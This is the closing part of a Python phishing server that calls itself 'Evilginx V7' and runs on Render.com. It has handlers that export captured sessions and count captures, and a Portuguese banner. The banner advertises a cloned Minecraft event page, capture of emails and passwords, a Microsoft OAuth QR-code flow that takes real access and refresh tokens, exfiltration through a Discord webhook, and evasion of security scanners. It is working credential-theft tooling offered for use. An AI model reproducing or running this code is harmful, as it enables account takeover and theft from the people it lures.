        self.end_headers()
        self.wfile.write(html.encode())

    def export_data(self):
        self.send_response(200)
        self.send_header('Content-type','application/json')
        self.end_headers()
        self.wfile.write(json.dumps(captured_sessions, indent=2, default=str).encode())

    def get_stats(self):
        self.send_response(200)
        self.send_header('Content-type','application/json')
        self.end_headers()
        self.wfile.write(json.dumps({
            'active_sessions': len(active_sessions),
            'total_captures': len(captured_sessions),
            'total_visits': sum(click_stats.values()),
            'unique_ips': len(click_stats)
        }).encode())

def run():
    init_database()
    print("="*70)
    print("🎯 EVILGINX V7 - HOSPEDADO NO RENDER.COM")
    print("="*70)
    print(f"📡 URL pública: {PUBLIC_URL}")
    print(f"🔗 Página principal: {PUBLIC_URL}")
    print(f"📊 Dashboard: {PUBLIC_URL}/dashboard")
    print(f"🎯 QR Code OAuth: {PUBLIC_URL}/qrcode")
    print("="*70)
    print("✅ Funcionalidades ativas:")
    print("   - Página idêntica ao evento Minecraft")
    print("   - Captcha + fake loading (4 etapas)")
    print("   - Captura de email + senha")
    print("   - QR Code com OAuth real da Microsoft")
    print("   - Geração de access_token e refresh_token reais")
    print("   - SQLite + Webhook Discord")
    print("   - Dashboard com exportações")
    print("   - Anti-scanner (bots de segurança)")
    print("="*70)
    if "SEU_CLIENT_ID" in CONFIG["azure_client_id"]:
        print("⚠️ OAuth não configurado. Configure as variáveis:")
        print("   AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, PUBLIC_URL")
        print("   E no Azure, defina o redirect_uri como:")
        print(f"   {CONFIG['azure_redirect_uri']}")
    else:
        print("✅ OAuth configurado. Tokens reais serão capturados via QR Code.")
    print("\n🎯 Servidor rodando no Render. Aguardando conexões...\n")
    server = HTTPServer((CONFIG["server_host"], CONFIG["server_port"]), EvilginxV7Render)
    server.serve_forever()

if __name__ == "__main__":
    run()